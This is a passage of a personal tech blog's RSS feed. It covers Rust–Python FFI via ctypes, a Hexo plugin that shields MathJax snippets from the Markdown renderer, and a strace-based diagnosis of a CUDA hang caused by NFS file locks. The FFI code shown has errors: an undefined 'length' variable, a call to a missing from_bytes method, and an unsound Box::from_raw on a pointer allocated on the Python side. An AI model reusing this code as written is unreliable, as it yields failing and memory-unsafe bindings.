part of code to bridge the FFI gap at Rust side</p><div class="gk-code hljs" data-gk-id="BLOCK13"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#[repr(C)]</span></span><br><span class="line"><span class="hljs-meta">#[derive(Debug)]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    len: <span class="hljs-type">usize</span>,</span><br><span class="line">    data: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>,</span><br><span class="line">    storage: *<span class="hljs-keyword">mut</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">FFIVec</span> {</span><br><span class="line">    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_to_slice</span>&lt;<span class="hljs-symbol">&#x27;a</span>&gt;(ptr: *<span class="hljs-keyword">mut</span> <span class="hljs-keyword">Self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;a</span> [<span class="hljs-type">u8</span>] {</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(ptr);</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">slice</span> = core::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(v.data, v.len);</span><br><span class="line">        std::mem::forget(v);</span><br><span class="line">        slice</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from_vec</span>(vec: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> <span class="hljs-keyword">Self</span> {</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">vec</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(vec);</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">Self</span> {</span><br><span class="line">            len: vec.<span class="hljs-title function_ invoke__">len</span>(),</span><br><span class="line">            data: vec.<span class="hljs-title function_ invoke__">as_ptr</span>(),</span><br><span class="line">            storage: <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(vec),</span><br><span class="line">        });</span><br><span class="line">        <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(v)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#[no_mangle]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">free_ffi_vec</span>(v: *<span class="hljs-keyword">mut</span> FFIVec) {</span><br><span class="line">    <span class="hljs-keyword">if</span> v != <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> FFIVec {</span><br><span class="line">        <span class="hljs-keyword">unsafe</span> {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(v);</span><br><span class="line">            <span class="hljs-title function_ invoke__">drop</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(v.storage));</span><br><span class="line">            <span class="hljs-title function_ invoke__">drop</span>(v)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#[no_mangle]</span></span><br><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">mod_widgets</span>(widgets: *<span class="hljs-keyword">mut</span> FFIVec, mods: *<span class="hljs-keyword">mut</span> FFIVec) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">const</span> FFIVec {</span><br><span class="line">    std::panic::<span class="hljs-title function_ invoke__">catch_unwind</span>(|| {</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">widgets</span>: &amp;[<span class="hljs-type">u8</span>] = FFIVec::<span class="hljs-title function_ invoke__">raw_to_slice</span>(widgets);</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">mods</span>: &amp;[<span class="hljs-type">u8</span>] = FFIVec::<span class="hljs-title function_ invoke__">raw_to_slice</span>(mods);</span><br><span class="line">        <span class="hljs-keyword">let</span> <span class="hljs-variable">new_widgets</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt; = <span class="hljs-title function_ invoke__">play_with</span>(widgets, mods);</span><br><span class="line">        FFIVec::<span class="hljs-title function_ invoke__">from_vec</span>(new_widgets)</span><br><span class="line">    })</span><br><span class="line">        <span class="hljs-comment">// returns NULL on panic</span></span><br><span class="line">        .<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-number">0</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> FFIVec)</span><br><span class="line">}</span><br></pre></div></div><h2 id="the-python-side">The Python Side</h2><p >It is now half the battle! And the rest half is easier to conquer.</p><p >To play with the shared library generated by Rust, we need the <a href="https://docs.python.org/3/library/ctypes.html">ctypes</a> module. <code>ctypes</code> is the FFI library for Python. It provides facilities to compose or read from C data structures, and allows calling functions from a shared library. I won’t give an overall introduction to the library since it’s such a huge project, but rather focus on what we would use.</p><h3 id="the-data-bridge">The Data Bridge</h3><p  class="nomargin"> We would first deal with data bridge. As a peer to <code>FFIVec</code> in Rust, we should also declare the same struct at Python side</p><div class="gk-code hljs" data-gk-id="BLOCK14"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FFIVec</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="hljs-string">&quot;len&quot;</span>, ctypes.c_size_t),</span><br><span class="line">        (<span class="hljs-string">&quot;data&quot;</span>, ctypes.c_void_p),</span><br><span class="line">        (<span class="hljs-string">&quot;_storage&quot;</span>, ctypes.c_void_p),</span><br><span class="line">    ]</span><br></pre></div></div><p  class="par"> The syntax is straight-forward. <code>ctypes</code> provides various data types like <code>c_size_t</code> or <code>c_void_p</code> to represents their correspondences in C. These types work as guidance for data conversion. For example, when an Python <code>int</code> object (which has varied length) passed to a <code>c_size_t</code>, <code>ctypes</code> would know that it should be casted into an 8-bit unsigned integer (on 64-bit platform), and vice versa.</p><p  class="nomargin"> The <code>FFIVec</code> class is only a broker. Just like in Rust, we must implement the conversion between it and some more common Python data types, <em>e.g.</em>, <code>bytearray</code> or <code>bytes</code>, to make it useful. The two methods below would work for the purpose</p><div class="gk-code hljs" data-gk-id="BLOCK15"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FFIVec</span>(...):</span><br><span class="line">    ...</span><br><span class="line"><span class="hljs-meta">    @classmethod</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_bytearray</span>(<span class="hljs-params">cls, buf: <span class="hljs-built_in">bytearray</span></span>) -&gt; <span class="hljs-string">&quot;FFIVec&quot;</span>:</span><br><span class="line">        l = <span class="hljs-built_in">len</span>(buf)</span><br><span class="line">        ptr = (ctypes.c_uint8 * l).from_buffer(buf)</span><br><span class="line">        data = ctypes.cast(ptr, ctypes.c_void_p)</span><br><span class="line">        <span class="hljs-keyword">return</span> cls(<span class="hljs-built_in">len</span>=length, data=data, _storage=<span class="hljs-literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_bytes</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:</span><br><span class="line">        ptr = (ctypes.c_uint8 * self.<span class="hljs-built_in">len</span>).from_address(self.data)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ptr)</span><br></pre></div></div><p  class="par"> The class method <code>from_bytearray()</code> creates an <code>FFIVec</code> instance from a given <code>bytearray</code> object. The instance shares the same memory view with that bytearray, and no memory copying occurs. The instance method <code>to_bytes()</code> instead constructs a <code>bytes</code> object, which the underlying memory is copied into.</p><blockquote><p  class="par"> You may notice the <code>c_uint8 * l</code> syntax. The expression is not doing arithmetics, but creates an <em><a href="https://docs.python.org/3/library/ctypes.html#arrays">array type</a></em>. It’s equivalent to C <code>uint8_t</code> array type with fixed length <code>l</code>. With this type, we can access the buffer address of a <code>bytearray</code> object, or pump data into a <code>bytes</code> object.</p></blockquote><h3 id="call-the-functions">Call the Functions</h3><p >There’s one last piece in our puzzle – to interact with the functions from a foreign language. But firstly, we should load the shared library. This can be handled by <code>ctypes.cdll.LoadLibrary</code></p><div class="gk-code hljs" data-gk-id="BLOCK16"><div class="gk-code-display"><pre><span class="line">libw = ctypes.cdll.LoadLibrary(<span class="hljs-string">&quot;path/to/libmod_widgets.so&quot;</span>)</span><br></pre></div></div><p  class="par"> After that, we declare the functions to be called, by attributing <code>libw</code></p><div class="gk-code hljs" data-gk-id="BLOCK17"><div class="gk-code-display"><pre><span class="line">PFFIVec = ctypes.POINTER(FFIVec)</span><br><span class="line"></span><br><span class="line">mod_widgets = libw.mod_widgets</span><br><span class="line">mod_widgets.argtypes = (PFFIVec, PFFIVec)</span><br><span class="line">mod_widgets.restype = PFFIVec</span><br><span class="line"></span><br><span class="line">free_ffi_vec = libw.free_ffi_vec</span><br><span class="line">free_ffi_vec.argtypes = (PFFIVec,)</span><br></pre></div></div><blockquote><p  class="par"> In the above code, we also specify the argument and return types of the foreign functions. This is not required <sup id="fnref:8"><a href="#fn:8">8</a></sup>, but I recommend to do so whenever possible. Specifying the types can avoid data being incorrectly coerced by <code>ctypes</code>.</p></blockquote><p  class="nomargin"> That’s it! The functions <code>mod_widgets</code> and <code>free_ffi_vec</code> can now be called just like ordinary Python functions</p><div class="gk-code hljs" data-gk-id="BLOCK18"><div class="gk-code-display"><pre><span class="line">old_widgets = <span class="hljs-built_in">bytearray</span>(...)</span><br><span class="line">mods = <span class="hljs-built_in">bytearray</span>(...)</span><br><span class="line">new_widgets = mod_widgets(</span><br><span class="line">    FFIVec.from_bytes(old_widgets),</span><br><span class="line">    FFIVec.from_bytes(mods),</span><br><span class="line">).contents  <span class="hljs-comment"># .contents dereferences the pointer</span></span><br><span class="line"></span><br><span class="line">new_widgets_bytes = new_widgets.to_bytes()  <span class="hljs-comment"># copy out as bytes</span></span><br><span class="line">free_ffi_vec(new_widgets)  <span class="hljs-comment"># de-allocate at Rust side</span></span><br></pre></div></div><p  class="noindent"> Cheers!</p><h2 id="epilogue-1">Epilogue</h2><p >This post showcases a simple yet practical example to call functions written in Rust from Python. I deliberately built all the stuff from scratch. Working at such a low level forces me to think carefully about potential edge cases, which I have never noticed before. It’s quite an entertainment and I learnt a good lesson.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">no memory leaking, no double freeing</li><li class="footnote" id="fn:2">least memory copies possible</li><li class="footnote" id="fn:3"><a href="https://en.wikipedia.org/wiki/Foreign_function_interface">https://en.wikipedia.org/wiki/Foreign_function_interface</a></li><li class="footnote" id="fn:4"><code>.so</code> files in Linux or <code>.dll</code> files in Windows</li><li class="footnote" id="fn:5">how to pass the arguments. by registers? by stack?</li><li class="footnote" id="fn:6">how to order the fields of a struct? pad short fields or not?</li><li class="footnote" id="fn:7"><a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html">https://doc.rust-lang.org/std/panic/fn.catch_unwind.html</a></li><li class="footnote" id="fn:8"><a href="https://docs.python.org/3/library/ctypes.html#specifying-the-required-argument-types-function-prototypes">https://docs.python.org/3/library/ctypes.html#specifying-the-required-argument-types-function-prototypes</a></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/FFI/">FFI</category>
      
      
      <comments>https://i.hsfzxjy.site/rust-python-ffi-from-scratch/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Extending Hexo For My Site] Part 1 - Better Mathjax Rendering</title>
      <link>https://i.hsfzxjy.site/extending-hexo-better-mathjax-rendering/</link>
      <guid>https://i.hsfzxjy.site/extending-hexo-better-mathjax-rendering/</guid>
      <pubDate>Sun, 02 Jan 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I am a heavy user of &lt;a href=&quot;https://www.mathjax.org/&quot;&gt;Mathjax&lt;/a&gt;. Mathjax is a library that renders Tex-compatible syntax into pretty</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I am a heavy user of <a href="https://www.mathjax.org/">Mathjax</a>. Mathjax is a library that renders Tex-compatible syntax into pretty equations in web scenarios. Hence I am always mixing up Markdown and Tex snippets in my writing. The annoying part is Tex snippets have low priority in my Markdown renderer, and are sometimes incorrectly rendered into Markdown elements. For instance, <code>$a_1, a_2$</code> becomes <code>$a<em>1, a</em>2$</code>, where underscores within <code>$...$</code> are mistakenly recognized as an emphasis element. A bunch of escaping is required to avoid the situation, which drives me mad. So I got to seek a permanant solution.</p><p >The first attempt was to add specialized logic for Tex snippets into Markdown renderer, but I soon found it hardly a neat workaround. The renderer I use is <a href="https://github.com/markedjs/marked">marked</a>. The package itself does not work alone, but depends on <a href="https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a> as a wrapper. If I would add magic in <em>marked</em>, I had to fork and edit both <em>marked</em> and <em>hexo-renderer-marked</em>. Also, parsing Tex snippets is something beyond the duty of a Markdown renderer. There is no reason to nail the two stuff together, and I gave up.</p><p >Then I came up with another idea: what if I “guard” the Tex snippets before feeding the content into Markdown renderer? By “guarding” I mean to replace Tex snippets by something that <em>marked</em> ignores, and restore them after <em>marked</em> finishes rendering.</p><p >Actually, Hexo <em>DOES</em> provide such an official trick, though it’s not mentioned in the docs. In short, you can wrap a piece of content with a special tag <code>&lt;hexoPostRenderCodeBlock &gt;...&lt;/hexoPostRenderCodeBlock&gt;</code> in a <code>before_post_render</code> filter, to prevent it from being parsed by renderer. The code that handles the trick can be found at <a href="https://github.com/hexojs/hexo/blob/11b145c6c4aacbb69b4c10d49245090dd1db6375/lib/hexo/post.js#L402">hexo/post.js</a>. Before taken over by renderer, all <code>&lt;hexoPostRenderCodeBlock &gt;</code> tags will be detached and replaced by some special HTML comment tags like <code>&lt;--code\uFFFCxxx--&gt;</code>. After renderer finishes, each comment tag is substituted back to inner content of corresponding <code>&lt;hexoPostRenderCodeBlock &gt;</code> tag. Such usage exists both in <a href="https://github.com/hexojs/hexo/blob/11b145c6c4/lib/plugins/filter/before_post_render/backtick_code_block.js#L95">Hexo built-in plugin</a> and in <a href="https://github.com/Aetf/hexo-prism-plus/blob/a44d14c639c49482d43807b8f298e287a8b1d9d1/src/code_block.js#L33">the wild</a>.</p><p >Our goal is clear now: build a <code>before_post_render</code> filter, which finds out each piece of legitimate Tex snippets, either inline-level <code>$...$</code> or block-level <code>$$...$$</code>, and wraps them with the magical <code>&lt;hexoPostRenderCodeBlock &gt;</code> tag. The matching can be realized using simple regular expressions:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span> rBlockMath = <span class="hljs-regexp">/^\$\$([^\$]+?)\$\$/gm</span></span><br><span class="line"><span class="hljs-keyword">const</span> rInlineMath = <span class="hljs-regexp">/(?&lt;!\$)\$([^\$\n]+?)\$(?!\$)/g</span></span><br></pre></div></div><p  class="par"> <code>rInlineMath</code> contains certain assertions in case block-level snippets mistakenly being interpreted as inline ones. Such concern can alternatively be addressed by first matching block-level snippets and then inline ones, but I would rather use assertions for better clarification.</p><p >Beyond the regular expressions, there is still some edge cases that should be carefully taken into consideration – <code>$</code> within code blocks should never be touched. Unfortunately, it’s not straightforward (or impossible) to achieve with mere regular expressions, since code block context is too complicated to match. A workaround here is required, that is to detach all code blocks beforehand, then handle the Tex snippets, and lastly restore the code blocks.</p><p >It’s also worth noting that <code>before_post_render</code> filters from other plugins can be executed prior to us, and thus <code>&lt;hexoPostRenderCodeBlock &gt;</code> tags can pre-exist in the content, whose inner texts are also expected to remain untouched. Our workaround then needs to handle three cases, magical tags and two forms of code blocks (single-backticked and triple-backticked).</p><p >But in fact, it is enough to consider only two of them. There’s a less known filter bundled in the <a href="https://github.com/hexojs/hexo/tree/11b145c6c4aacbb69b4c10d49245090dd1db6375/lib/plugins">built-in plugin</a> named <a href="https://github.com/hexojs/hexo/blob/11b145c6c4/lib/plugins/filter/before_post_render/backtick_code_block.js">backtick_code_block</a>. The filter syntax-highlights triple-backticked code blocks and guards them with the magical tag. At the time our filter gets executed, triple-backticked code blocks will have already been wrapped in <code>&lt;hexoPostRenderCodeBlock &gt;</code>, and no need to handle.</p><p >So here’s the pipeline: 1) find out all existing <code>&lt;hexoPostRenderCodeBlock &gt;</code> and single-backticked code blocks, and detach them; 2) find out all Tex snippets (inline or block-level), and wrap them with <code>&lt;hexoPostRenderCodeBlock &gt;</code> tag; 3) restore the aforementioned detached items. It’s also critical to register the filter with priority larger than 10, so that <code>backtick_code_block</code> filter will be called before us.</p><p >The filter <code>mathjax</code> is packed in plugin <code>hexo-enhanced</code> and the code at <a href="https://github.com/hsfzxjy/hexo-enhanced/blob/main/lib/filter/before_post_render/mathjax.js">lib/filter/before_post_render/mathjax.js</a>. With it enabled, you can now write math equations on the fly just like in a Tex file, without any burden of escaping special characters.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      
      <comments>https://i.hsfzxjy.site/extending-hexo-better-mathjax-rendering/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Extending Hexo For My Site] Part 0 - Preface</title>
      <link>https://i.hsfzxjy.site/extending-hexo-preface/</link>
      <guid>https://i.hsfzxjy.site/extending-hexo-preface/</guid>
      <pubDate>Fri, 31 Dec 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I’ve been struggling to choose a handy tool for blogging about seven or eight years ago. Before the day I’ve tried building my own blog </description>
        
      
      
      
      <content:encoded><![CDATA[<p >I’ve been struggling to choose a handy tool for blogging about seven or eight years ago. Before the day I’ve tried building my own blog system using Django. It was great proudness and excitement to see the first “Hello World” post appeared in my browser, but soon I realized that was far from a ready-to-use product. The editor on the admin site was less functional than Sublime Text or VSCode, and sometimes buggy. The rendered content would mess up and out of my control from time to time. And most importantly, I had to pay for a VPS (or PaaS, still costly) to run the site. I was in high school at the time, and no much income for the bills. Too much trivia to care about just for a perfect writing experience. So I gave up.</p><p >It was then I read about the concept of static site generators. I love the idea that separates writing from post rendering and publishing. One will have enough freedom to pick the most suitable tool in either stage. No more need to endure the shitty web editors and I can embrace my favourite local ones. Also the renderer is highly customizable, plus lots of fabulous themes to choose from.</p><p >At this era you may recommend Hugo, but I chose Hexo then, partly because of the Node.js booming at that time. It was hardly said to be perfect initially, but as years passed I’ve made it much more handy, by developing plugins to meet my own requirements. I have bundled them in this repository <a href="https://github.com/hsfzxjy/hexo-enhanced">hexo-enhanced</a>. Some of them are short in source code, but greatly improve my experience during writing. I am going to open up a new series to share the story behind the plugin.</p><h2 id="table-of-contents-1">Table of Contents</h2><ul><li><a href="../2022-01-03-extending-hexo-better-mathjax-rendering/">Part 1 - Better Mathjax Rendering</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Series/">Series</category>
      
      
      
      <comments>https://i.hsfzxjy.site/extending-hexo-preface/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Debug a &#39;torch.tensor(1).cuda()&#39; hanging</title>
      <link>https://i.hsfzxjy.site/tensor-cuda-hang/</link>
      <guid>https://i.hsfzxjy.site/tensor-cuda-hang/</guid>
      <pubDate>Mon, 13 Dec 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Today a user of our GPU cluster ran into a problem where executing &lt;code&gt;python -c &amp;#39;import torch; torch.tensor(1).cuda()&lt;/code&gt; woul</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Today a user of our GPU cluster ran into a problem where executing <code>python -c &#39;import torch; torch.tensor(1).cuda()</code> would hang forever and could not be killed. The problem occured on a rather old Docker image (with <code>torch == 0.4.0</code>), and would disappear if newer images were used. It was caused by some far less known coincidents, which surprised me and I want to share in this post.</p><h2 id="the-problem">The Problem</h2><p >The hanging program is spawned by following command:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">/usr/bin/docker run --<span class="hljs-built_in">rm</span> -u 1457:1457 \</span><br><span class="line">    --gpus <span class="hljs-string">&#x27;&quot;device=&#x27;</span>0,1,2,3<span class="hljs-string">&#x27;&quot;&#x27;</span> \</span><br><span class="line">    -v /ghome/username:/ghome/username -v /gdata/username:/gdata/username \</span><br><span class="line">    -it --ipc=host --shm-size 64G \</span><br><span class="line">    -v /gdata1/username:/gdata1/username -v /gdata2/username:/gdata2/username \</span><br><span class="line">    -e HOME=/ghome/username \</span><br><span class="line">    -m 48G --memory-swap 48G --cpus 5 \</span><br><span class="line">    --name username2 \</span><br><span class="line">    bit:5000/deepo_9 \</span><br><span class="line">    python3 -c <span class="hljs-string">&#x27;import torch; torch.tensor(1).cuda()&#x27;</span></span><br></pre></div></div><p  class="par"> the Docker image <code>bit:5000/deepo_9</code> he used was built with CUDA-9, while the host has multiple 1080Ti GPU cards and CUDA upgraded to 11.4. Looks like there’s some binary incompatibility, considering the fact that the problem would gone with newer images.</p><h2 id="step-1-find-out-the-incorrect-arguments">Step 1: Find out the incorrect arguments</h2><p >But firstly, I have to confirm that there is no mis-configuration. Programs stuck from time to time on our cluster, and some were caused by mis-configuration from users, such as incorrect <code>docker run</code> arguments. I then decided to take a try on a most simplified version of command</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">/usr/bin/docker run --<span class="hljs-built_in">rm</span> -u 1457:1457 \</span><br><span class="line">    --gpus <span class="hljs-string">&#x27;&quot;device=&#x27;</span>0,1,2,3<span class="hljs-string">&#x27;&quot;&#x27;</span> \</span><br><span class="line">    --name username2 \</span><br><span class="line">    bit:5000/deepo_9 \</span><br><span class="line">    python3 -c <span class="hljs-string">&#x27;import torch; torch.tensor(1).cuda()&#x27;</span></span><br></pre></div></div><p  class="par"> This command worked just fine, which suggests that the problem is from some combination of other arguments.</p><p >I should find out what the combination is. For which I progressively added back the arguments, one at a time. And finally it turned out that <code>-v /ghome/username:/ghome/username</code> and <code>-e HOME=/ghome/username</code> mutually caused the stuck.</p><h2 id="step-2-find-out-the-trapped-io">Step 2: Find out the trapped IO</h2><p  class="noindent"> The above finding offers two hints:</p><ol><li>Something performs IO under <code>$HOME</code>;</li><li>Such IO works well with default setting <code>HOME=/</code>, but stucks with <code>HOME=/ghome/username</code>.</li></ol><p  class="par"> So what’s different between <code>/</code> and <code>/ghome/username</code>? If you write under both directories, the previous one would be resolved into the container FS layer, while the latter to an external volume, with NFS as underlying FS. It might be a special IO operation that differs on the two file systems.</p><p >To find out the operation, I attached <code>strace</code> to the python process, which would spy and print out all syscalls the program invoked. The logs rolled by and eventually stopped at following lines</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">open(&quot;/ghome/username/.nv/ComputeCache/index&quot;, O_RDWR) = 30</span><br><span class="line">clock_gettime(CLOCK_MONOTONIC_RAW, {tv_sec=551059, tv_nsec=515612618}) = 0</span><br><span class="line">fcntl(30, F_SETLK, {l_type=F_RDLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = ?</span><br><span class="line">+++ killed by SIGKILL +++</span><br></pre></div></div><p  class="par"> Now we know the culprit is an <code>flock</code> attempt on file <code>/ghome/username/.nv/ComputeCache/index</code>, residing on NFS. NFS does not co-operate well with file locks, which typically shows up as hanging a program.</p><h2 id="step-3-whos-performing-the-io">Step 3: Who’s performing the IO?</h2><p >Now it’s a bit weird. The python process executes merely nothing, and I cannot figure out where the IO came from. I hence typed <code>.nv/ComputeCache</code> in Google inquiring for answer. The first entry popped up was <a href="https://developer.nvidia.com/blog/cuda-pro-tip-understand-fat-binaries-jit-caching/">CUDA Pro Tip: Understand Fat Binaries and JIT Caching</a>, where I read the following</p><blockquote><p >nvcc, the CUDA compiler driver, uses a two-stage compilation model. The first stage compiles source device code to PTX virtual assembly, and the second stage compiles the PTX to binary code for the target architecture. The CUDA driver can execute the second stage compilation at run time, compiling the PTX virtual assembly “Just In Time” to run it. This JIT compilation can cause delay at application start-up time (or more accurately, CUDA context creation time). CUDA uses two approaches to mitigate start-up overhead on JIT compilation: fat binaries and JIT caching.</p><p  class="nomargin"> […]</p><p  class="nomargin"> <code>CUDA_CACHE_PATH</code> specifies the directory location of compute cache files; the default values are:</p><ul><li>[…]</li><li>on Linux, <code>~/.nv/ComputeCache</code></li></ul></blockquote><p  class="par"> It turns out that CUDA runtime itself is the executer. Either no fat binaries found or fat binaries incompatibility in PyTorch triggers the second approach JIT caching. The docs also mentions a potential problem (similar to what we have met) and corresponding solution</p><blockquote><h3 id="cache-stored-on-a-slow-network-share">Cache stored on a Slow Network Share</h3><p >On Linux, the default location of the CUDA JIT cache is in your home directory. On clusters, it is not uncommon to mount home directories with relatively poor performance to the compute nodes (by using the Lustre file system for scratch space, but only NFS for the home directory, for example). We have seen cases where this relatively slow connection to the home directory (and thus the JIT cache) resulted in very long application start-up times when the application was not built with code for the right SM version. Even more confusing, start-up time can vary from node to node due to intricacies of the NFS set up.</p><p >In this situation, it is best to build the application to avoid JIT entirely, and alternatively, to set <code>CUDA_CACHE_PATH</code> to point to a location on a fast file system.</p></blockquote><h2 id="epilogue">Epilogue</h2><p >So it was actually a less known (at least by me) feature of CUDA runtime, coincides with a rare usecase (NFS as home directory). Surprising results, but also teaches me some interesting facts beyond the user space boundary.</p><p >I’ve tried to figure out why newer images just works well. They won’t trigger the JIT caching, which suggests pre-compiled fat binaries are compatible with the current arch. I compared the binaries by dumping information using <code>cuobjdump</code>, but noticed nothing (or just I am not familiar with the stuff). Or maybe I should start by comparing the compilation flags of the two PyTorch versions. I don’t have the time, so I give up.</p><p >Oh, and lastly, <code>strace</code> is always our friend.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      
      <comments>https://i.hsfzxjy.site/tensor-cuda-hang/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>不自由的互联网</title>
      <link>https://i.hsfzxjy.site/internet-is-not-liberal/</link>
      <guid>https://i.hsfzxjy.site/internet-is-not-liberal/</guid>
      <pubDate>Mon, 22 Nov 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;互联网正在变得不自由——这已经成为了一种共识。这种不自由是从获取内容的角度出发，我们依自己的意愿获取知识/资讯的难度在增加。「中文互联网已死」。优质资源被各大互联网巨头所垄断，人们只能从应用内部访问，并时常受到推荐算法的说教。在巨头领域之外的公网则是一片荒漠，充斥着大量低</description>
        
      
      
      
